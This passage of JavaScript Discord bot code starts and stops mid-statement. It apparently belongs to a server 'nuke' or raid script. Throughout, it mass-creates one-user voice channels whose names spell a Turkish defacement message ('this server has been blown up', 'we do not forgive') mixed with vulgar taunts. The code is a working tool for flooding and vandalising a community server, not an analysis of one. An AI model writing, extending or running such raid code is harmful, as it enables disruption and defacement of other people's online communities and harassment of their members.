      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
